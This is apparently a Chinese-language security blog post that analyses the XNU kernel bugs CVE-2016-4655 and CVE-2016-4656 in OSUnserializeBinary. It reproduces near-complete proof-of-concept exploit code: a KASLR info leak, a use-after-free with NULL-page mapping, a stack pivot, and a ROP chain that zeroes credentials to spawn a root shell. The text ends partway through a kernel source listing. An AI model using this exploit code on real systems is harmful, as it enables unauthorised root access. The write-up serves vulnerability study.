序列化与反序列化在软件开发的过程中，两个模块通信时就需要序列化与发序列化，常见的xml-&gt;JSON，对应的反序列化JOSN-&gt;xml。简单来说就是数据格式上的一种相互转化。在XNU内核也有一个实现，OSUnserializeXML(将xml格式转化为内核数据对象)和OSUnserializeBinary(将二进制格式转化为内核数据对象) OSUnserializeBinary的二进制格式OSUnserializeBinary这个函数将连续的二进制流分成uint32_t32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下 123456789101112131415161718#define kOSSerializeBinarySignature \"\\323\\0\\0\" /* 0x000000d3 */enum &#123; kOSSerializeDictionary = 0x01000000U, kOSSerializeArray = 0x02000000U, kOSSerializeSet = 0x03000000U, kOSSerializeNumber = 0x04000000U, kOSSerializeSymbol = 0x08000000U, kOSSerializeString = 0x09000000U, kOSSerializeData = 0x0a000000U, kOSSerializeBoolean = 0x0b000000U, kOSSerializeObject = 0x0c000000U, kOSSerializeTypeMask = 0x7F000000U, kOSSerializeDataMask = 0x00FFFFFFU, kOSSerializeEndCollection = 0x80000000U,&#125;; 这里的0x000000d3代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。kOSSerializeTypeMask和kOSSerializeDataMask分别为类型和数据大小掩码。kOSSerializeEndCollection代表当前集合(dic，array或set)是否结束。可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。 当前集合是否结束 当前数据类型 当前元素长度 0 0000000 000000000000000000000000 例如下面的二进制数据 10x000000d3 0x81000000 0x09000004 0x41414141 0x8b000001 则对应： 1234&lt;dict&gt; &lt;string&gt;AAAA&lt;/string&gt; //键key &lt;boolean&gt;1&lt;/boolean&gt; //值value&lt;/dict&gt; 这样的数据结构。对应过程也很简单，0x000000d3标志为合法的签名，0x81000000为dic类型且为最后一个元素，0x09000004为4字节大小的字符串，0x8b000001为bool型，所以只需用最后一位代表true或false OSUnserializeBinary()分析完整源代码见文末，下面将对其中几个重要的地方分别做分析说明 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647while (ok)&#123; bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) &#123; case kOSSerializeDictionary: ... case kOSSerializeArray: ... case kOSSerializeSet: ... case kOSSerializeObject: ... case kOSSerializeNumber: ... case kOSSerializeSymbol: ... case kOSSerializeString: ... case kOSSerializeData: ... case kOSSerializeBoolean: ... default: break; &#125; ... 进行一些初始化和检查后就进入while(ok)循环，并且是以32位的整数位单位遍历循环，读取当前的整数key，确定其长度len，当前集合31位是否设置end。并通过类型掩码kOSSerializeTypeMask确定其key的类型从而进入不同的case。例如我们看kOSSerializeDictionary例子 1234case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; o为指向当前反序列化对象的指针，在每种case中被指定 123456case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; 这里当遇到一个为kOSSerializeData类型时，根据其len找到其数据并将其存储在OSData数据结构中，并移动next。其他的case都做类似对应的处理。跳出switch 1if (!(ok = (o != 0))) break; 因为每一次循环都会进入case并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。 123456if (!isRef)&#123; setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++;&#125; 这里很重要将与后面的漏洞相关，首先判断isRef是否被设置。 123456case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; isRef只有当当前的类型为kOSSerializeObject即引用类型是才被设为true，这里引用的意思则表示当前指向dic中其他数据，其值为对应下标。回到前面那里，下面重点关注setAtIndex这个宏定义 123456789101112131415#define setAtIndex(v, idx, o) \\ if (idx &gt;= v##Capacity) \\ &#123; \\ uint32_t ncap = v##Capacity + 64; \\ typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o)); \\ if (!nbuf) ok = false; \\ if (v##Array) \\ &#123; \\ bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \\ kfree(v##Array, v##Capacity * sizeof(o)); \\ &#125; \\ v##Array = nbuf; \\ v##Capacity = ncap; \\ &#125; \\ if (ok) v##Array[idx] = o; 看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到objs数组中对应的位置。 123456789101112131415161718192021222324252627282930313233343536if (dict)&#123; if (sym) &#123; if (o != dict) ok = dict-&gt;setObject(sym, o, true); o-&gt;release(); sym-&gt;release(); sym = 0; &#125; else &#123; sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) &#123; sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; &#125; ok = (sym != 0); &#125; &#125; else if (array) &#123; ok = array-&gt;setObject(o); o-&gt;release(); &#125; else if (set) &#123; ok = set-&gt;setObject(o); o-&gt;release(); &#125; else &#123; assert(!parent); result = o; &#125; 对解析出来的当前的集合做对应处理，比如这里的如果dic为真，因为dic字典数据结构需要key-&gt;value键值对的形式，所以先判断sym，若没设置，则代表当前o对象为key，则将其转化为OSSymbol类型，设置sym为true并将ofree，那么下一次的o代表的对象一定是值，然后就将sym和o以键值对的形式存储在dic字典中，如此交替。后面的代码对漏洞来说不是很重要了 123456789101112131415161718192021222324252627282930if (newCollect)&#123; if (!end) &#123; stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; &#125; DEBG(\"++stack[%d] %p\\n\", stackIdx, parent); parent = o; dict = newDict; array = newArray; set = newSet; end = false; &#125; if (end) &#123; if (!stackIdx) break; parent = stackArray[stackIdx]; DEBG(\"--stack[%d] %p\\n\", stackIdx, parent); stackIdx--; set = 0; dict = 0; array = 0; if (!(dict = OSDynamicCast(OSDictionary, parent))) &#123; if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); &#125; &#125; 简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当end时就将整个新集合放入之前的dic。 0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞 CVE-2016-4655-infoleak和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。 下面看漏洞点，回顾之前kOSSerializeNumber这个case内容 123456789case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; 这里存在什么问题呢？这里没有检查OSNumber的长度，也就是说我们可以创建一个任意长度的OSNumber，进而在内核读取的时候越界，然后泄漏内核地址信息。 CVE-2016-4656-UAF漏洞UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。来看下漏洞点，下面的代码是序列化字典dic将OSString这个键转化为OSSymbol，见下 123456789101112131415161718if (dict)&#123; if (sym) &#123; ... &#125; else &#123; sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) &#123; sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; &#125; ok = (sym != 0); &#125; &#125; 这里o-&gt;release()有什么问题呢?还记得objsArray吧，用来存储所有的对象，但是用setAtIndex这个宏来将所有的对象o存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面kOSSerializeObject中的switchcase。 123456case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; 此时之前存储在之前的objsArray的OSString已经free，而 o = objsArray[len]; o-&gt;retain();由对其进行了retain引用，好的一个完美的UAF漏洞。所以我们可以构造一个字典dic，其中OSString包含一些配对的值，然后序列化一个kOSSerializeObject引用对象，OSString将调用retain，但却是一个被释放的对象。 0x04 漏洞利用-PoC分析同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用 CVE-2016-4655-infoleak漏洞利用infoleak漏洞利用步骤： 构造一个包含过长的OSNumberdic字典 用这个序列化字典去设置userclient对象的属性 读回设置的OSNumber属性，造成infoleak 利用读取回来的内核地址信息计算KASLR 完整的代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768uint64_t kslide_infoleak(void)&#123; kern_return_t kr = 0, err = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; io_service_t serv = 0; io_connect_t conn = 0; io_iterator_t iter = 0; uint64_t kslide = 0; void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte WRITE_IN(dict, (0x00414141)); // 'AAA' key + NUL byte in little-endian WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr == KERN_SUCCESS) &#123; printf(\"(+) Dictionary is valid! Spawning user client...\\n\"); &#125; else return -1; serv = IOServiceGetMatchingService(master, IOServiceMatching(\"IOHDIXController\")); kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn); if (kr == KERN_SUCCESS) &#123; printf(\"(+) UC successfully spawned! Leaking bytes...\\n\"); &#125; else return -1; IORegistryEntryCreateIterator(serv, \"IOService\", kIORegistryIterateRecursively, &amp;iter); io_object_t object = IOIteratorNext(iter); char buf[0x200] = &#123;0&#125;; mach_msg_type_number_t bufCnt = 0x200; kr = io_registry_entry_get_property_bytes(object, \"AAA\", (char *)&amp;buf, &amp;bufCnt); if (kr == KERN_SUCCESS) &#123; printf(\"(+) Done! Calculating KASLR slide...\\n\"); &#125; else return -1;#if 0 for (uint32_t k = 0; k &lt; 128; k += 8) &#123; printf(\"%#llx\\n\", *(uint64_t *)(buf + k)); &#125;#endif uint64_t hardcoded_ret_addr = 0xffffff80003934bf; kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr; printf(\"(i) KASLR slide is %#016llx\\n\", kslide); return kslide;&#125; 构造字典看下面这段代码 1234void *dict = calloc(1, 512);uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0) 这里的WRITE_IN这个宏只是为了方便我们将数据填入内存之中 xml的字典格式 1234&lt;dict&gt; &lt;symbol&gt;AAA&lt;/symbol&gt; &lt;number size=0x200&gt;0x4141414141414141&lt;/number&gt;&lt;/dict&gt; 对应的代码 123456789WRITE_IN(dict, (0x000000d3)); // 头部签名WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典WRITE_IN(dict, (kOSSerializeSymbol | 4)); // 长度为3的symbolWRITE_IN(dict, (0x00414141)); // 'AAA' key键WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); //0x200大小的numberWRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); //实际8字节的number 利用io_service_get_matching_services_bin测试我们的dic是否有效 1234567host_get_io_master(mach_host_self(), &amp;master); // get iokit master portkr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);if (kr == KERN_SUCCESS) &#123; printf(\"(+) Dictionary is valid! Spawning user client...\\n\");&#125; else return -1; 若kr == KERN_SUCCESS则我们的dic则为有效 生成UserClient设定属性我们需要一个UserClient用来和内核通信，所以使用io_service_open_extended来产生一个相关服务的UserClient，这里的服务并不重要 1234567serv = IOServiceGetMatchingService(master, IOServiceMatching(\"IOHDIXController\"));kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);if (kr == KERN_SUCCESS) &#123; printf(\"(+) UC successfully spawned! Leaking bytes...\\n\");&#125; else return -1; 首先我们通过IOServiceGetMatchingService去从IORegistry里匹配一个特定服务，然后通过io_service_open_extended让可以设置其属性并打开一个服务即隐式产生UserClient接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代IORegistry找到刚刚创建的UserClient。 12IORegistryEntryCreateIterator(serv, \"IOService\", kIORegistryIterateRecursively, &amp;iter);io_object_t object = IOIteratorNext(iter); 先通过serv端口创建io_iterator_t，我们的UserClient在serv创建之后，所以拿到iter后迭代一次即为我们的UserClient，现在就可以读取其属性并触发info-leak。 读取属性，触发info-leak12345678char buf[0x200] = &#123;0&#125;;mach_msg_type_number_t bufCnt = 0x200;kr = io_registry_entry_get_property_bytes(object, \"AAA\", (char *)&amp;buf, &amp;bufCnt);if (kr == KERN_SUCCESS) &#123; printf(\"(+) Done! Calculating KASLR slide...\\n\");&#125; else return -1; 通过io_registry_entry_get_property_bytes我们可以获取到原始字节，存在buf中，我们打印其值 123for (uint32_t k = 0; k &lt; 128; k += 8) &#123; printf(\"%#llx\\n\", *(uint64_t *)(buf + k));&#125; 对应输出： 1234567890x4141414141414141 // 有效的number0xffffff8033c66284 //0xffffff8035b5d800 //0x4 // 其他数据或返回地址0xffffff803506d5a0 //0xffffff8033c662b4 //0xffffff818d2b3e30 //0xffffff80037934bf // 函数返回地址... 我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数这里实际读取的代码位于is_io_registry_entry_get_property_bytes函数，即io_registry_entry_get_property_bytes调用了 is_io_registry_entry_get_property_bytes。 is_io_registry_entry_get_property_bytes源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/* Routine io_registry_entry_get_property */kern_return_t is_io_registry_entry_get_property_bytes( io_object_t registry_entry, io_name_t property_name, io_struct_inband_t buf, mach_msg_type_number_t *dataCnt )&#123; OSObject * obj; OSData * data; OSString * str; OSBoolean * boo; OSNumber * off; UInt64 offsetBytes; unsigned int len = 0; const void * bytes = 0; IOReturn ret = kIOReturnSuccess; CHECK( IORegistryEntry, registry_entry, entry );#if CONFIG_MACF if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name)) return kIOReturnNotPermitted;#endif obj = entry-&gt;copyProperty(property_name); if( !obj) return( kIOReturnNoResources ); // One day OSData will be a common container base class // until then... if( (data = OSDynamicCast( OSData, obj ))) &#123; len = data-&gt;getLength(); bytes = data-&gt;getBytesNoCopy(); &#125; else if( (str = OSDynamicCast( OSString, obj ))) &#123; len = str-&gt;getLength() + 1; bytes = str-&gt;getCStringNoCopy(); &#125; else if( (boo = OSDynamicCast( OSBoolean, obj ))) &#123; len = boo-&gt;isTrue() ? sizeof(\"Yes\") : sizeof(\"No\"); bytes = boo-&gt;isTrue() ? \"Yes\" : \"No\"; &#125; else if( (off = OSDynamicCast( OSNumber, obj ))) &#123; /* j: reading an OSNumber */ offsetBytes = off-&gt;unsigned64BitValue(); len = off-&gt;numberOfBytes(); bytes = &amp;offsetBytes;#ifdef __BIG_ENDIAN__ bytes = (const void *) (((UInt32) bytes) + (sizeof( UInt64) - len));#endif &#125; else ret = kIOReturnBadArgument; if( bytes) &#123; if( *dataCnt &lt; len) ret = kIOReturnIPCError; else &#123; *dataCnt = len; bcopy( bytes, buf, len ); &#125; &#125; obj-&gt;release(); return( ret );&#125; 下面代码表示正在读取OSNumber， 123456789...else if( (off = OSDynamicCast( OSNumber, obj ))) &#123; offsetBytes = off-&gt;unsigned64BitValue(); /* j: the offsetBytes variable is allocated on the stack */ len = off-&gt;numberOfBytes(); /* j: this reads out our malformed length, 0x200 */ bytes = &amp;offsetBytes; /* j: bytes* ptr points to a stack variable */ ...&#125;... 然后 12345678if( bytes) &#123; if( *dataCnt &lt; len) ret = kIOReturnIPCError; else &#123; *dataCnt = len; bcopy( bytes, buf, len ); /* j: this leaks data from the stack */ &#125;&#125; 执行bcopy时，从bytes里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值 计算内核偏移将/System/Library/Kernels/kernel拖入hopper，搜索is_io_registry_entry_get_property_bytes，如下图 然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值 10xffffff80037934bf - 0xffffff80003934bf = 0x3400000 也就是下面这段代码所示： 12345uint64_t hardcoded_ret_addr = 0xffffff80003934bf;kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;printf(\"(i) KASLR slide is %#016llx\\n\", kslide); 现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！ CVE-2016-4656-UAF漏洞利用XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步深入理解Linux堆分配器-DLMalloc这篇分析。那么下面要做的就是如何构造下一个分配的对象，这里我们用OSData因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次o-&gt;retain引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步详解virtual table简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。下面看我们的步骤： 制作一个二进制字典，释放OSString并重新分配OSData。 Map NULL 放置stack pivot在偏移0x20到NULL页面 将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链） 触发漏洞 提升权限，生成shell 下面看完整的Poc代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697void use_after_free(void)&#123; kern_return_t kr = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; /* craft the dictionary */ printf(\"(i) Crafting dictionary...\\n\"); void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries WRITE_IN(dict, (kOSSerializeString | 4)); // string 'AAA', will get freed WRITE_IN(dict, (0x00414141)); WRITE_IN(dict, (kOSSerializeBoolean | 1)); // bool, true WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol 'BBB' WRITE_IN(dict, (0x00424242)); WRITE_IN(dict, (kOSSerializeData | 32)); // data (0x00 * 32) WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol 'CCC' WRITE_IN(dict, (0x00434343)); WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1)); // ref to object 1 (OSString) /* map the NULL page */ mach_vm_address_t null_map = 0; vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE); kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0); if (kr != KERN_SUCCESS) return; macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK); printf(\"(i) Leaking kslide...\\n\"); SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide /* set the stack pivot at 0x20 */ *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot /* build ROP chain */ printf(\"(i) Building ROP chain...\\n\"); rop_chain_t *chain = calloc(1, sizeof(rop_chain_t)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, \"_current_proc\")); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, \"_proc_ucred\")); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, \"_posix_cred_get\")); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, \"_bzero\")); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, \"_thread_exception_return\")); /* chain transfer, will redirect execution flow from 0x0 to our main chain above */ uint64_t *transfer = (uint64_t *)0x0; transfer[0] = ROP_POP_RSP(map); transfer[1] = (uint64_t)chain-&gt;chain; /* trigger */ printf(\"(+) All done! Triggering the bug!\\n\"); host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr != KERN_SUCCESS) return;&#125; 这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到下面一步一步分析 构造字典将如下构造 123456789101112&lt;dict&gt; &lt;string&gt;AAA&lt;/string&gt; &lt;boolean&gt;true&lt;/boolean&gt; &lt;symbol&gt;BBB&lt;/symbol&gt; &lt;data&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &lt;/data&gt; &lt;symbol&gt;CCC&lt;/symbol&gt; &lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt;&lt;/dict&gt; 当执行retain时就会以0x20的偏移量地址读取，也就是rip其值将为0x20可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术 Map NULL苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。 1234567mach_vm_address_t null_map = 0;vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);if (kr != KERN_SUCCESS) return; 这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志 Pivoting stack和ROP链下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip首先将rip转移到0x20处 1*(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot 然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。 123uint64_t *transfer = (uint64_t *)0x0;transfer[0] = ROP_POP_RSP(map);transfer[1] = (uint64_t)chain-&gt;chain; 接着rip转移到main-&gt;chain，和前面一样ROP链一样，不过主链是为了达到提权的目的。主链的代码 123456789101112131415rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, \"_current_proc\"));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, \"_proc_ucred\"));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, \"_posix_cred_get\"));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, \"_bzero\"));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, \"_thread_exception_return\")); 主链的执行过程其实原理并不复杂： 12345678chain prototype: proc = current_proc();//找到当前程序的credentials结构ucred = proc_ucred(proc);posix_cred = posix_cred_get(ucred);bzero(posix_cred, (sizeof(int) * 3));//将组id设为0即提权为rootthread_exception_return();//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。 接下来的代码和之前一样，测试我们构造的dic是否有效： 12345host_get_io_master(mach_host_self(), &amp;master); // get iokit master portkr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);if (kr != KERN_SUCCESS) return; 最后如果一切都顺利，我们检查当前进程getuid是否等于0，如果是就提权root成功，然后调用system(&quot;/bin/bash&quot;)弹出一个shell！ 1234if (getuid() == 0) &#123; puts(\"(+) got r00t!\"); system(\"/bin/bash\");&#125; 测试： 0x04 总结终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的黄大大和杨君大大，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，UAF，Vtable等等等等。也印证了今天在微博上看到教主的那句话：学好书不求甚解，爱技术不论用处，当我去用之前所学去理解一个个知识点的时候才体会到后半句：每有会意便欣然忘食 PoC完整的Poc代码在这里 特别感谢 mrh –这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗 jndok’s blog –本文大多基于jndok的分析，可以去看看原文的分析 杨君的小黑屋–杨君大大特别有耐心，执着于技术，乐于分享技术 参考1.User Client Info.txt2.Attacking-The-XNU-Kernal-In-El-Capitain3.Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-18284.Defiling-Mac-OS-X-Ruxcon5.Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value6.认真分析mmap：是什么 为什么 怎么用7.Resolving kernel symbols OSUnserializeBinary源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212OSObject *OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString)&#123; OSObject ** objsArray; uint32_t objsCapacity; uint32_t objsIdx; OSObject ** stackArray; uint32_t stackCapacity; uint32_t stackIdx; OSObject * result; OSObject * parent; OSDictionary * dict; OSArray * array; OSSet * set; OSDictionary * newDict; OSArray * newArray; OSSet * newSet; OSObject * o; OSSymbol * sym; size_t bufferPos; const uint32_t * next; uint32_t key, len, wordLen; bool end, newCollect, isRef; unsigned long long value; bool ok; if (errorString) *errorString = 0; if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL); if (3 &amp; ((uintptr_t) buffer)) return (NULL); if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL); bufferPos = sizeof(kOSSerializeBinarySignature); next = (typeof(next)) (((uintptr_t) buffer) + bufferPos); DEBG(\"---------OSUnserializeBinary(%p)\\n\", buffer); objsArray = stackArray = NULL; objsIdx = objsCapacity = 0; stackIdx = stackCapacity = 0; result = 0; parent = 0; dict = 0; array = 0; set = 0; sym = 0; ok = true; while (ok) &#123; bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); DEBG(\"key 0x%08x: 0x%04x, %d\\n\", key, len, end); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) &#123; case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeArray: o = newArray = OSArray::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeSet: o = newSet = OSSet::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; case kOSSerializeSymbol: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; if (0 != ((const char 